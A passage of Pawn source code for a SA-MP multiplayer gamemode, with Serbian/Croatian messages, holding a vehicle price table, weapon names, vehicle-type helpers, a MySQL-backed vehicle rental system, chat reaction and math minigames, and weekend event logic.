	{ 449, 0, 0 }, // Tram edit
	{ 450, 0, 0 }, // Article Trailer 2 edit
	{ 451, 1400000, 4250 }, // Turismo
	{ 452, 450000, 2250 }, // Speeder edit
	{ 453, 220000, 1100 }, // Reefer edit
	{ 454, 800000, 4000 }, // Tropic edit
	{ 455, 0, 0 }, // Flatbed
	{ 456, 0, 0 }, // Yankee
	{ 457, 180000, 900 }, // Caddy edit
	{ 458, 205000, 1025 }, // Solair edit
	{ 459, 0, 0 }, // Topfun Van (Berkley's RC)
	{ 460, 640000, 3200 }, // Skimmer edit
	{ 461, 650000, 3250 }, // PCJ-600
	{ 462, 190000, 950 }, // Faggio
	{ 463, 350000, 1750 }, // Freeway
	{ 464, 0, 0 }, // RC Baron edit
	{ 465, 0, 0 }, // RC Raider edit
	{ 466, 100000, 500 }, // Glendale
	{ 467, 100000, 500 }, // Oceanic
	{ 468, 800000, 2500 }, // Sanchez
	{ 469, 590000, 2950 }, // Sparrow edit
	{ 470, 440000, 2200 }, // Patriot
	{ 471, 290000, 1450 }, // Quad
	{ 472, 0, 0 }, // Coastguard edit
	{ 473, 170000, 850 }, // Dinghy edit
	{ 474, 110000, 550 }, // Hermes
	{ 475, 600000, 2175 }, // Sabre
	{ 476, 415000, 2075 }, // Rustler edit
	{ 477, 620000, 3100 }, // ZR-350
	{ 478, 0, 0 }, // Walton
	{ 479, 165000, 825 }, // Regina
	{ 480, 620000, 3100 }, // Comet
	{ 481, 30000, 150 }, // BMX edit
	{ 482, 250000, 1250 }, // Burrito
	{ 483, 215000, 1075 }, // Camper
	{ 484, 505000, 2525 }, // Marquis edit
	{ 485, 0, 0 }, // Baggage edit
	{ 486, 0, 0 }, // Dozer
	{ 487, 950000, 4750 }, // Maverick edit
	{ 488, 0, 0 }, // SAN News Maverick edit
	{ 489, 410000, 2050 }, // Rancher
	{ 490, 0, 0 }, // FBI Rancher edit
	{ 491, 195000, 975 }, // Virgo
	{ 492, 205000, 1025 }, // Greenwood
	{ 493, 405000, 2025 }, // Jetmax edit
	{ 494, 930000, 4650 }, // Hotring Racer edit
	{ 495, 1300000, 2250 }, // Sandking edit
	{ 496, 245000, 1225 }, // Blista Compact
	{ 497, 0, 0 }, // Police Maverick edit
	{ 498, 0, 0 }, // Boxville
	{ 499, 0, 0 }, // Benson
	{ 500, 315000, 1575 }, // Mesa
	{ 501, 0, 0 }, // RC Goblin edit
	{ 502, 930000, 4650 }, // Hotring Racer edit
	{ 503, 930000, 4650 }, // Hotring Racer edit
	{ 504, 0, 0 }, // Bloodring Banger edit
	{ 505, 0, 0 }, // Rancher
	{ 506, 900000, 3150 }, // Super GT
	{ 507, 280000, 1400 }, // Elegant
	{ 508, 0, 0 }, // Journey
	{ 509, 30000, 150 }, // Bike edit
	{ 510, 25000, 125 }, // Mountain Bike edit
	{ 511, 0, 0 }, // Beagle edit
	{ 512, 545000, 2725 }, // Cropduster edit
	{ 513, 515000, 2575 }, // Stuntplane edit
	{ 514, 0, 0 }, // Tanker
	{ 515, 0, 0 }, // Roadtrain
	{ 516, 230000, 1150 }, // Nebula
	{ 517, 250000, 1250 }, // Majestic
	{ 518, 185000, 925 }, // Buccaneer
	{ 519, 2000000, 10000 }, // Shamal edit
	{ 520, 0, 0 }, // Hydra edit
	{ 521, 1200000, 4250 }, // FCR-900
	{ 522, 2500000, 5000 }, // NRG-500
	{ 523, 0, 0 }, // HPV1000 edit
	{ 524, 0, 0 }, // Cement Truck
	{ 525, 0, 0 }, // Towtruck
	{ 526, 335000, 1675 }, // Fortune
	{ 527, 215000, 1075 }, // Cadrona edit
	{ 528, 0, 0 }, // FBI Truck edit
	{ 529, 200000, 1000 }, // Willard
	{ 530, 0, 0 }, // Forklift edit
	{ 531, 315000, 1575 }, // Tractor
	{ 532, 0, 0 }, // Combine Harvester
	{ 533, 240000, 1200 }, // Feltzer
	{ 534, 185000, 925 }, // Remington
	{ 535, 225000, 1125 }, // Slamvan
	{ 536, 220000, 1100 }, // Blade
	{ 537, 0, 0 }, // Freight edit
	{ 538, 0, 0 }, // Brownstreak edit
	{ 539, 0, 0 }, // Vortex edit
	{ 540, 420000, 2100 }, // Vincent edit
	{ 541, 1500000, 4400 }, // Bullet
	{ 542, 205000, 1025 }, // Clover
	{ 543, 195000, 975 }, // Sadler
	{ 544, 0, 0 }, // Firetruck LA edit
	{ 545, 530000, 2650 }, // Hustler
	{ 546, 210000, 1050 }, // Intruder
	{ 547, 215000, 1075 }, // Primo
	{ 548, 0, 0 }, // Cargobob edit
	{ 549, 280000, 1400 }, // Tampa
	{ 550, 390000, 1950 }, // Sunrise
	{ 551, 340000, 1700 }, // Merit
	{ 552, 0, 0 }, // Utility Van edit
	{ 553, 0, 0 }, // Nevada edit
	{ 554, 570000, 2850 }, // Yosemite
	{ 555, 370000, 1850 }, // Windsor
	{ 556, 0, 0 }, // Monster "A" edit
	{ 557, 0, 0 }, // Monster "B" edit
	{ 558, 600000, 2600 }, // Uranus
	{ 559, 800000, 3050 }, // Jester
	{ 560, 1700000, 4750 }, // Sultan
	{ 561, 585000, 2925 }, // Stratum
	{ 562, 1200000, 3450 }, // Elegy
	{ 563, 0, 0 }, // Raindance edit
	{ 564, 0, 0 }, // RC Tiger edit
	{ 565, 540000, 2700 }, // Flash
	{ 566, 205000, 1025 }, // Tahoma
	{ 567, 225000, 1125 }, // Savanna
	{ 568, 400000, 2000 }, // Bandito
	{ 569, 0, 0 }, // Freight Flat Trailer edit
	{ 570, 0, 0 }, // Streak Trailer edit
	{ 571, 0, 0 }, // Kart
	{ 572, 0, 0 }, // Mower
	{ 573, 2000000, 3850 }, // Dune
	{ 574, 0, 0 }, // Sweeper
	{ 575, 385000, 1925 }, // Broadway
	{ 576, 195000, 975 }, // Tornado
	{ 577, 0, 0 }, // AT400 edit
	{ 578, 600000, 3000 }, // DFT-30
	{ 579, 2000000, 4100 }, // Huntley
	{ 580, 440000, 2200 }, // Stafford
	{ 581, 580000, 2900 }, // BF-400
	{ 582, 0, 0 }, // Newsvan edit
	{ 583, 0, 0 }, // Tug edit
	{ 584, 0, 0 }, // Petrol Trailer edit
	{ 585, 210000, 1050 }, // Emperor
	{ 586, 400000, 2000 }, // Wayfarer
	{ 587, 600000, 2050 }, // Euros
	{ 588, 0, 0 }, // Hotdog edit
	{ 589, 700000, 2425 }, // Club
	{ 590, 0, 0 }, // Freight Box Trailer edit
	{ 591, 0, 0 }, // Article Trailer 3 edit
	{ 592, 0, 0 }, // Andromada edit
	{ 593, 395000, 1975 }, // Dodo edit
	{ 594, 0, 0 }, // RC Cam edit
	{ 595, 0, 0 }, // Launch edit
	{ 596, 0, 0 }, // Police Car (LSPD) edit
	{ 597, 0, 0 }, // Police Car (SFPD) edit
	{ 598, 0, 0 }, // Police Car (LVPD) edit
	{ 599, 0, 0 }, // Police Ranger edit
	{ 600, 305000, 1525 }, // Picador
	{ 601, 0, 0 }, // S.W.A.T. edit
	{ 602, 405000, 2025 }, // Alpha
	{ 603, 800000, 3025 }, // Phoenix
	{ 604, 0, 0 }, // Glendale Shit edit
	{ 605, 0, 0 }, // Sadler Shit edit
	{ 606, 0, 0 }, // Baggage Trailer "A" edit
	{ 607, 0, 0 }, // Baggage Trailer "B" edit
	{ 608, 0, 0 }, // Tug Stairs Trailer edit
	{ 609, 0, 0 }, // Boxville
	{ 610, 0, 0 }, // Farm Trailer edit
	{ 611, 0, 0 } // Utility Trailer edit
};

//------------------------------------------------------------------------------

new WeapNames[ 48 ][ 32 ] = {
	"Unarmed",
	"Brass Knuckles",
	"Golf Club",
	"Night Stick",
	"Knife",
	"Baseball Bat",
	"Shovel",
	"Pool Cue",
	"Katana",
	"Chainsaw",
	"Purple Dildo",
	"Big White Vibrator",
	"Medium White Vibrator",
	"Small White Vibrator",
	"Flowers",
	"Cane",
	"Grenade",
	"Tear Gas",
	"Molotov",
	"Invalid Weapon",
	"Invalid Weapon",
	"Invalid Weapon",
	"Colt 45",
	"Silenced Colt 45",
	"Desert Eagle",
	"Shotgun",
	"Sawn-off Shotgun",
	"Combat Shotgun",
	"Micro SMG",
	"SMG",
	"AK47",
	"M16",
	"Tec9",
	"Country Rifle",
	"Sniper Rifle",
	"Rocket Launcher",
	"HS Rocket Launcher",
	"Flamethrower",
	"Minigun",
	"Satchel Charge",
	"Detonator",
	"Spray Can",
	"Fire Extinguisher",
	"Camera",
	"Night Vision Goggles",
	"Infrared Vision Goggles",
	"Parachute",
	"Fake Pistol"
};

//===============================[ FUNKCIJE ]=================================//

ResetujWarIgraca( playerid )
{
    WARPInfo[ playerid ][ WARTim ][ 0 ] = false;
    WARPInfo[ playerid ][ WARTim ][ 1 ] = false;
    WARPInfo[ playerid ][ WARUbistva ] = 0;
    WARPInfo[ playerid ][ WARSmrti ] = 0;
    WARPInfo[ playerid ][ WARIgrac ] = -1;
}

_:public BikeBunnyHop( playerid )
{
	if( BikeBH[ playerid ] == 1 ) BikeBH[ playerid ] = 0;
	return 1;
}

_:public CruiseControl(playerid)
{
    new vid = GetPlayerVehicleID( playerid ), Float:x, Float:y, Float:z;
	GetVehicleVelocity(vid, x, y, z);

	new keys, ud, lr;
	GetPlayerKeys( playerid, keys, ud, lr );

	new Float:angle, Float:heading, Float:speed;
	GetVehicleZAngle( vid, angle );
	GetVehicleHeadingAngle( vid, heading );
	DistanceFlat( 0, 0, x, y, speed );

	if( PlayerCruiseSpeed[ playerid ] == 0.00 || GetPlayerState( playerid ) != PLAYER_STATE_DRIVER || (speed < 0.7 * PlayerCruiseSpeed[ playerid ] ) || z > 1 || (floatabs(angle - heading) > 50 && floatabs(angle - heading) < 310))
	{
	    KillTimer(cruise_control[playerid]);
	    PlayerCruiseSpeed[ playerid ] = 0.00;
		SendClientMessage(playerid, 0xE2C058FF, "(VOZILO): Ugasio si tempomat, da ga upalis pritisni {FFFFFF}(N).");
		Tempomat[ playerid ] = false;
		return(false);
	}
	GetVehicleZAngle( vid, PlayerHeadingAngle[ playerid ] );
	GetXYVelocity( vid, x, y, PlayerCruiseSpeed[ playerid ] );
	SetVehicleVelocity( vid, x, y, z );
	return 1;
}

GetAngleToXY(Float:X9, Float:Y9, Float:CurrentX, Float:CurrentY, &Float:Angle)
{
    Angle = atan2(Y9-CurrentY, X9-CurrentX);
    Angle = floatsub(Angle, 90.0);
    if(Angle < 0.0) Angle = floatadd(Angle, 360.0);
}

GetVehicleSpeed(vehicleid)
{
	new Float:Vx, Float:Vy, Float:Vz;
	GetVehicleVelocity(vehicleid, Vx, Vy, Vz);

    new Float:rtn;
    rtn = floatsqroot(floatpower(Vx*100,2) + floatpower(Vy*100,2));
    rtn = floatsqroot(floatpower(rtn,2) + floatpower(Vz*100,2));
    return floatround(rtn);
}

DistanceFlat(Float:ax, Float:ay, Float:bx, Float:by, &Float:distance)
{
	distance = floatsqroot(floatpower(bx-ax,2)+floatpower(by-ay,2));
	return floatround(distance);
}

GetXYVelocity(vehicleid, &Float:x, &Float:y, Float:speed)
{
	new Float:a;
	x = 0.0;
	y = 0.0;
	GetVehicleZAngle(vehicleid, a);
	x += (speed * floatsin(-a, degrees));
	y += (speed * floatcos(-a, degrees));
}

GetVehicleHeadingAngle(vehicleid, &Float:a)
{
	new Float:x, Float:y, Float:z;
	GetVehicleVelocity(vehicleid, x, y, z);
	GetAngleToXY(x, y, 0, 0, a);
}

_:public IsVehicleDrivingBackwards(vehicleid)
{
	new Float:Float[3];
	if(GetVehicleVelocity(vehicleid, Float[1], Float[2], Float[0]))
	{
		GetVehicleZAngle(vehicleid, Float[0]);
		if(Float[0] < 90)
		{
			if(Float[1] > 0 && Float[2] < 0) return 1;
		}
		else if(Float[0] < 180)
		{
			if(Float[1] > 0 && Float[2] > 0) return 1;
		}
		else if(Float[0] < 270)
		{
			if(Float[1] < 0 && Float[2] > 0) return 1;
		}
		else if(Float[1] < 0 && Float[2] < 0) return 1;
	}
	return(false);
}

_:public SMG_TogglePlayerControllable( playerid, bool:boolean )
{
	TogglePlayerControllable( playerid, boolean );
	PlayerFreezed[ playerid ] = boolean;
	return 1;
}
//------------------------------------------------------------------------------
GetNearestRentVehicle(playerid)
{
	new Float:p_Pos[3], Float:maxradius = 2.0, id = -1;
	GetPlayerPos(playerid, p_Pos[0], p_Pos[1], p_Pos[2]);

    foreach(new i : iter_Rent)
    {
        if(VectorSize(p_Pos[0] - VoziloRentInfo[i][vrLiP_Pos_X], p_Pos[1] - VoziloRentInfo[i][vrLiP_Pos_Y], p_Pos[2] - VoziloRentInfo[i][vrLiP_Pos_Z]) >= maxradius) continue;

        id = i;
        maxradius = VectorSize(p_Pos[0] - VoziloRentInfo[i][vrLiP_Pos_X], p_Pos[1] - VoziloRentInfo[i][vrLiP_Pos_Y], p_Pos[2] - VoziloRentInfo[i][vrLiP_Pos_Z]);
    }
    return id;
}
//--
_:public mSQL_CreateVehicleRent( createID )
{
	static q[1000];
    mysql_format( mSQL, q, sizeof( q ),

		"INSERT INTO `rents` ( `vrLiP_Pos_X`, `vrLiP_Pos_Y`, `vrLiP_Pos_Z`, `vrSpawn_Pos_X`, `vrSpawn_Pos_Y`, `vrSpawn_Pos_Z`, `vrSpawn_Pos_A` ) \
		VALUES( '%f', '%f', '%f', '%f', '%f', '%f', '%f' )",

        	VoziloRentInfo[createID][vrLiP_Pos_X], VoziloRentInfo[createID][vrLiP_Pos_Y], VoziloRentInfo[createID][vrLiP_Pos_Z], VoziloRentInfo[createID][vrSpawn_Pos_X], VoziloRentInfo[createID][vrSpawn_Pos_Y],
			VoziloRentInfo[createID][vrSpawn_Pos_Z], VoziloRentInfo[createID][vrSpawn_Pos_A] );

    mysql_pquery( mSQL, q, "OnRentCreated", "i", createID );
    
    Iter_Add(iter_Rent, createID);
	return 1;
}
_:public OnRentCreated( createID )
{
	VoziloRentInfo[ createID ][ vrSQLID ] = cache_insert_id();

	new string[90];
	format(string, sizeof(string), "Rent - ({FFFFFF}%d{008080})\nDa iznajmite vozilo kucajte {FFFFFF}\"/rentveh\"", createID);
	VoziloRentInfo[createID][VoziloRentLabel] = CreateDynamic3DTextLabel(string, 0x008080FF, VoziloRentInfo[createID][vrLiP_Pos_X], VoziloRentInfo[createID][vrLiP_Pos_Y], VoziloRentInfo[createID][vrLiP_Pos_Z], 10.0, IPI, IVI, 0, -1, -1);
	VoziloRentInfo[createID][VoziloRentPickup] = CreateDynamicPickup(19607, 1, VoziloRentInfo[createID][vrLiP_Pos_X], VoziloRentInfo[createID][vrLiP_Pos_Y], VoziloRentInfo[createID][vrLiP_Pos_Z], 0, 0);
	return 1;
}
// --
_:public OnRentsLoad()
{
    new rows, fields, thisID, string[90];
    cache_get_data( rows, fields, mSQL );

	if( rows )
	{
		for( new i = 0; i < rows; i ++ )
		{
			thisID = Iter_Free(iter_Rent);

            VoziloRentInfo[ thisID ][ vrSQLID ] 			= cache_get_field_content_int( i, "vrSQLID" );
            VoziloRentInfo[ thisID ][ vrLiP_Pos_X ] 		= cache_get_field_content_float( i, "vrLiP_Pos_X" );
            VoziloRentInfo[ thisID ][ vrLiP_Pos_Y ] 		= cache_get_field_content_float( i, "vrLiP_Pos_Y" );
            VoziloRentInfo[ thisID ][ vrLiP_Pos_Z ] 		= cache_get_field_content_float( i, "vrLiP_Pos_Z" );
            VoziloRentInfo[ thisID ][ vrSpawn_Pos_X ]		= cache_get_field_content_float( i, "vrSpawn_Pos_X" );
            VoziloRentInfo[ thisID ][ vrSpawn_Pos_Y ] 		= cache_get_field_content_float( i, "vrSpawn_Pos_Y" );
            VoziloRentInfo[ thisID ][ vrSpawn_Pos_Z ] 		= cache_get_field_content_float( i, "vrSpawn_Pos_Z" );
            VoziloRentInfo[ thisID ][ vrSpawn_Pos_A ] 		= cache_get_field_content_float( i, "vrSpawn_Pos_A" );

			format(string, sizeof(string), "Rent - ({FFFFFF}%d{008080})\nDa iznajmite vozilo kucajte {FFFFFF}\"/rentveh\"", thisID);
			VoziloRentInfo[thisID][VoziloRentLabel] = CreateDynamic3DTextLabel(string, 0x008080FF, VoziloRentInfo[thisID][vrLiP_Pos_X], VoziloRentInfo[thisID][vrLiP_Pos_Y], VoziloRentInfo[thisID][vrLiP_Pos_Z], 10.0, IPI, IVI, 0, -1, -1);
			VoziloRentInfo[thisID][VoziloRentPickup] = CreateDynamicPickup(19607, 1, VoziloRentInfo[thisID][vrLiP_Pos_X], VoziloRentInfo[thisID][vrLiP_Pos_Y], VoziloRentInfo[thisID][vrLiP_Pos_Z], 0, 0);
		
			Iter_Add(iter_Rent, thisID);
		}
	}
	printf("(U) SQL: Ucitao - Rentovi(%d)", rows);
    return 1;
}
//------------------------------------------------------------------------------
IsANoTrunkVehicle( vehicleID )
{
	switch( GetVehicleModel( vehicleID ) )
	{
	    case 403,406,407,408,411,416,417,423,424,425,430,432,434,435,441,443,444,446,447,449,450,452,453,454,457,460,464,
			 465,469,472,473,476,481,485,486,493,494,495,501,502,503,504,505,509,510,512,513,514,515,520,524,525,528,530,
			 531,532,537,538,539,544,552,556,557,564,568,569,570,571,572,573,574,578,583,584,590,591,592,593,594,595,601,
			 606,607,608,610,611: return 1;
	}
	return(false);
}
//------------------------------------------------------------------------------
IsNumeric(const string[])
{
	for (new i = 0, j = strlen(string); i < j; i++)
	{
		if (string[i] > '9' || string[i] < '0') return 0;
	}
	return 1;
}
//------------------------------------------------------------------------------
bool:IsVehicleEmpty(vehicleid)
{
	foreach(new i : Player)
	{
		if(IsPlayerInAnyVehicle(i) && GetPlayerVehicleID(i) == vehicleid) return true;
	}
	return true;
}

/*bool:isATrucker( vehicleid)
{
	switch(GetVehicleModel( vehicleid))
	{
		case 422, 600, 543, 478, 554, 413, 440, 459, 482: return true;
	}
	return(false);
}*/

bool:IsVehicleBajs(vehid)
{
	switch(GetVehicleModel(vehid))
	{
		case 481, 509, 510: return true;
	}
	return(false);
}

/*bool:isATractor( vehid )
{
	if( GetVehicleModel( vehid ) == 531 ) return true;
	return(false);
}
bool:isAHarvester( vehid )
{
	if( GetVehicleModel( vehid ) == 532 ) return true;
	return(false);
}*/

bool:IsVehiclePrikolica(vehid)
{
	switch(GetVehicleModel(vehid))
	{
		case 435, 450, 584, 591, 611, 610: return true;
	}
	return(false);
}

bool:IsVehicleMotor(vehid)
{
	switch(GetVehicleModel(vehid))
	{
		case 448, 461, 462, 463, 468, 471, 521, 522, 523, 586, 581: return true;
	}
	return(false);
}

bool:IsVehicleAuto(vehid)
{
	switch(GetVehicleModel(vehid))
	{
		case 400, 401, 402, 404, 405, 409, 410, 411, 412, 415, 419, 420, 421, 422,
	    426, 429, 434, 436, 438, 439, 442, 445, 451, 458, 466, 467, 470, 474, 475,
		477, 478, 479, 480, 489, 490, 491, 492, 494, 495, 496, 500, 502, 503, 504,
		505, 506, 507, 516, 517, 518, 525, 526, 527, 528, 529, 533, 534, 535, 536,
		540, 541, 542, 543, 545, 546, 547, 549, 550, 551, 552, 554, 555, 558, 559,
		560, 561, 562, 565, 566, 567, 568, 575, 576, 579, 580, 585, 587, 589, 596,
		597, 598, 599, 600, 602, 603, 604, 605, 444, 457, 483, 485, 530, 531, 539,
		556, 557, 574, 424, 583, 572: return true;
	}
	return(false);
}

bool:IsVehicleC1(vehid)
{
	switch(GetVehicleModel(vehid))
	{
		case 499, 482, 498, 588, 609, 414, 582, 413, 440, 459, 456, 416, 423, 427,
		428, 508, 573, 601, 418: return true;
	}
	return(false);
}

bool:IsVehicleC2(vehid)
{
	switch(GetVehicleModel(vehid))
	{
		case 406, 407, 408, 431, 432, 433, 437, 443, 455, 486, 524, 532, 544, 578: return true;
	}
	return(false);
}

bool:IsVehicleC3(vehid)
{
	switch(GetVehicleModel(vehid))
	{
		case 403, 514, 515: return true;
	}
	return(false);
}

bool:IsVehicleBrod(vehid)
{
	switch(GetVehicleModel(vehid))
	{
		case 472, 473, 493, 595, 484, 430, 453, 452, 446, 454: return true;
	}
	return(false);
}

bool:IsVehicleLetelica(vehid)
{
	switch(GetVehicleModel(vehid))
	{
		case 417, 425, 447, 460, 469, 476, 487, 488, 497, 511, 512, 513, 519,
			 520, 548, 553, 563, 577, 592, 593: return true;
	}
	return(false);
}

bool:IsVehicleBrodAS(vehid)
{
	switch(vehid)
	{
		case 472, 473, 493, 595, 484, 430, 453, 452, 446, 454: return true;
	}
	return(false);
}

bool:IsVehicleLetelicaAS(vehid)
{
	switch(vehid)
	{
		case 417, 425, 447, 460, 469, 476, 487, 488, 497, 511, 512, 513, 519,
			 520, 548, 553, 563, 577, 592, 593: return true;
	}
	return(false);
}

_:public HexToInt(string[]) // By DracoBlue
{
  	if(string[ 0 ] == 0) return(false);

 	new i, cur = 1, res = 0;
  	for(i = strlen(string); i > 0; i--)
  	{
  	  	if(string[i-1] < 58) res = res+cur * (string[i-1]-48);
		else res = res+cur * (string[i-1] - 65+10);
    	cur = cur*16;
  	}
  	return res;
}
_:public reactionRandom( Min, Max )
{
	new bracalskaarmijaxaxa;
	bracalskaarmijaxaxa = Min + random( Max );
	return bracalskaarmijaxaxa;
}

_:public StartReaction( )
{
	if( !reactionWon )
	{
		SendClientMessageToAllEx( 0xE57BD2FF, "(REACTION): Niko nije napisao {FFFFFF}%s {E57BD2}na vreme.", reactionMessage[ 0 ] );
	}
	reactionMessage[ 0 ] = " ";
	reactionMessage[ 1 ] = " ";
	reactionWinner[ 0 ] = EOS;

	reactionMoney = reactionRandom(.Min = 2000, .Max = 2000),

	reactionMessage[ 0 ] = " ";

	for( new c; c < 7; ++c )
	{
		reactionMessage[ 0 ][ c ] = random(2) ? ( '0' + random(9) ) : ( random(2) ? ( 'a' + random(26) ) : ( 'A' + random(26) ) );
	}

	SendClientMessageToAllEx( 0xE57BD2FF, "(REACTION): Ko prvi napise {FFFFFF}%s {E57BD2}dobija {FFFFFF}($%s).", reactionMessage[ 0 ], fNumber(reactionMoney));

	reactionTest = 3;
	reactionTime = GetTickCount( );
}

_:public EndReaction( playerid )
{
    DajIgracuNovac( playerid, reactionMoney );

    reactionTime = ( GetTickCount( ) - reactionTime );

	foreach(new i : Player)
	{
		if( i != playerid )
		{
 			SCMF( i, 0xE57BD2FF, "(REACTION): {FFFFFF}%s {E57BD2}je prvi napisao {FFFFFF}%s(%dms). {E57BD2}CESTITKE.", ImeIgraca( playerid ), reactionMessage[ 0 ], reactionTime );
		}
	}

	reactionTest = 0;

	SCMF( playerid, 0xE57BD2FF, "(REACTION): Prvi ste napisali reakciju u {FFFFFF}%dms (%d sec) {E57BD2}te dobili {FFFFFF}($%i). {E57BD2}CESTITKE.", reactionTime, floatround(reactionTime*0.001), reactionMoney );

    PlayerInfo[ playerid ][ xReactionPoen ]++;
    if( PlayerInfo[ playerid ][ xReactionPoen ] == 500 )
	{
		PlayerInfo[ playerid ][ xUPoen ]++;
		PlayerInfo[ playerid ][ xReactionPoen ] = 0;
		SendClientMessage( playerid, 0xE57BD2FF, "(U-POEN): Dobili ste jedan U-Poen zbog {FFFFFF}(500) {E57BD2}pogodjenih reakcija." );
	}
	sql_user_update_integer( playerid, "reaction_poen", PlayerInfo[ playerid ][ xReactionPoen ] );

	if( reactionTime < ServerInfo[ ReactTime ] )
	{
		SCMF( playerid, 0xE57BD2FF, "(REACTION): Oborili ste rekord igraca {FFFFFF}%s (%d ms). {E57BD2}Novi rekord je {FFFFFF}(%d ms).", ServerInfo[ ReactName ], ServerInfo[ ReactTime ], reactionTime );
		SendClientMessageToAllEx(0xE57BD2FF, "(REACTION): Oboren rekord igraca {FFFFFF}%s (%d ms). {E57BD2}Novi rekord je {FFFFFF}(%d ms).", ServerInfo[ ReactName ], ServerInfo[ ReactTime ], reactionTime );

		ServerInfo[ ReactTime ] = reactionTime;
		strmid( ServerInfo[ ReactName ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), MAX_PLAYER_NAME+1 );
		SaveServerStats( );
	}

	reactionWon = true;
	strmid( reactionWinner, ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), 32 );
}

_:public StartMatematika()
{
	if(!matka)
	{
		switch(random(7))
		{
		    case 0:
			{
				rezultat = (ranbroj[0]=random(1000)+1) + (ranbroj[1]=random(840)+1);
				SendClientMessageToAllEx(0x00AAFFFF, "(MATH): {FFFFFF}Novi zadatak iz matematike: {00AAFF}%d{FFFFFF} + {00AAFF}%d{FFFFFF} = ?", ranbroj[0], ranbroj[1]);
				matka = true;
			}
			
			case 1:
			{
				do
			    {
			    	rezultat = (ranbroj[0]=random(500)+1) - (ranbroj[1]=random(500)+1);
			    } 
			    while(ranbroj[0] < ranbroj[1]);
				SendClientMessageToAllEx(0x00AAFFFF, "(MATH): {FFFFFF}Novi zadatak iz matematike: {00AAFF}%d{FFFFFF} - {00AAFF}%d{FFFFFF} = ?", ranbroj[0], ranbroj[1]);
				matka = true;
			}
			
			case 2:
			{
				rezultat = (ranbroj[0]=random(100)+1) * (ranbroj[1]=random(80)+1);
				SendClientMessageToAllEx(0x00AAFFFF, "(MATH): {FFFFFF}Novi zadatak iz matematike: {00AAFF}%d{FFFFFF} * {00AAFF}%d{FFFFFF} = ?", ranbroj[0], ranbroj[1]);
				matka = true;
			}
			
			case 3:
			{
				do
			    {
			    	rezultat = (ranbroj[0]=random(1000)+1) / (ranbroj[1]=random(600)+1);
			    } 
			    while(ranbroj[0] % ranbroj[1]);
			    SendClientMessageToAllEx(0x00AAFFFF, "(MATH): {FFFFFF}Novi zadatak iz matematike: {00AAFF}%d{FFFFFF} / {00AAFF}%d{FFFFFF} = ?", ranbroj[0], ranbroj[1]);
			    matka = true;
			}
			
			case 4:
			{
  				rezultat = (ranbroj[0]=random(10)+1) * ranbroj[0];
			    SendClientMessageToAllEx(0x00AAFFFF, "(MATH): {FFFFFF}Novi zadatak iz matematike: Kvadrat od {00AAFF}%d{FFFFFF} = ?", ranbroj[0]);
			    matka = true;
			}
			
			case 5:
			{
  				rezultat = (ranbroj[0]=random(10)+1) * ranbroj[0] * ranbroj[0];
			    SendClientMessageToAllEx(0x00AAFFFF, "(MATH): {FFFFFF}Novi zadatak iz matematike: kub na treci {00AAFF}%d{FFFFFF} = ?", ranbroj[0]);
			    matka = true;
			}
			
			case 6:
			{
			    new rand = random(sizeof(Korijeni));
 				rezultat = Korijeni[rand][1];
			    SendClientMessageToAllEx(0x00AAFFFF, "(MATH): {FFFFFF}Novi zadatak iz matematike: Koren iz {00AAFF}%d{FFFFFF} = ?", Korijeni[rand][0]);
			    matka = true;
			}
		}
	}
	else
	{
	    matka = false;
		SendClientMessageToAllEx(0x00AAFFFF, "(MATH): {FFFFFF}Nitko nije rijesio test iz matematike. UCITE MATEMATIKU! {00AAFF}(rezultat: {FFFFFF}%d{00AAFF})", rezultat);
	}
	return 1;
}


_:public StartWeekendEvents()
{

	SendClientMessageToAllEx( 0x4282C0FF, "#EVENTWEEKEND: {FFFFFF}Server {FFFFFF}je pokrenuo {4282C0}Event {FFFFFF}za sve igrace" );

	switch(random(4))
	{
	    case 0:
		{
			EventInfo[ Started ] = event_STUNT;
			EventInfo[ Drivers ] = 0;
			EventInfo[ EventTime ] = MAX_TIME;
			EventInfo[ Position ] = 0;

			SetTimer_("EventTimeR", 1000, 1000, 24);

			SendClientMessageToAll( 0x6EF83CFF, "(EVENT - STUNT RACE): Imate {FFFFFF}(20) {6EF83C}sekundi da se pridruzite na event. {FFFFFF}[ /join ]" ); 
			DodajWarnRed("~b~(EVENT): SERVER ~w~je pokrenuo event ~b~'STUNT RACE'.");

		}
		case 1:
		{
			EventInfo[ Started ] = event_JETPACK;
			EventInfo[ Drivers ] = 0;
			EventInfo[ EventTime ] = MAX_TIME;
			EventInfo[ Position ] = 0;

			SetTimer_("EventTimeR", 1000, 1000, 24);

			SendClientMessageToAll( 0x6EF83CFF, "(EVENT - JETPACK RACE): Imate {FFFFFF}(20) {6EF83C}sekundi da se pridruzite na event. {FFFFFF}[ /join ]" ); 
			DodajWarnRed("~b~(EVENT): SERVER ~w~je pokrenuo event ~b~'JETPACK RACE'.");

		}
		case 2:
		{
			EventInfo[ Started ] = event_DRAG;
			EventInfo[ Drivers ] = 0;
			EventInfo[ EventTime ] = MAX_TIME;
			EventInfo[ Position ] = 0;

			SetTimer_("EventTimeR", 1000, 1000, 24);

			SendClientMessageToAll( 0x6EF83CFF, "(EVENT - DRAG RACE): Imate {FFFFFF}(20) {6EF83C}sekundi da se pridruzite na event. {FFFFFF}[ /join ]" ); 
			DodajWarnRed("~b~(EVENT): SERVER ~w~je pokrenuo event ~b~'DRAG RACE'.");
		}
		case 3:
		{
			EventInfo[ Started ] = event_TEMPLERUN;
			EventInfo[ Drivers ] = 0;
			EventInfo[ EventTime ] = MAX_TIME;
			EventInfo[ Position ] = 0;

			SetTimer_("EventTimeR", 1000, 1000, 24);

			SendClientMessageToAll( 0x6EF83CFF, "(EVENT - TEMPLE RUN): Imate {FFFFFF}(20) {6EF83C}sekundi da se pridruzite na event. {FFFFFF}[ /join ]" ); 
			DodajWarnRed("~b~(EVENT): SERVER ~w~je pokrenuo event ~b~'TEMPLE RUN'.");
		}
	}

	foreach(new i : Player)
	{
		if( i != IPI && PlayerLogged[ i ] != false )
		{
			new randomMoney = random(5000)+random(1500);
			DajIgracuNovac( i, randomMoney );

			SendClientMessageToAllEx( 0x4282C0FF, "#EVENTWEEKEND: {FFFFFF}Server {FFFFFF}je nagradio sve igrace sa {4282C0}(%d) {FFFFFF}$.", randomMoney );
		}
	}
}
//------------------------------------------------------------------------------

_:public CheckDeleteProperty( id )
{
	if( id != IPI )
	{
		if( PlayerInfo[ id ][ xProperty ][ 0 ] != -1 && strcmp( ImeIgraca( id ), II[ PlayerInfo[ id ][ xProperty ][ 0 ] ][ iOwner ], true) == 0)
		{
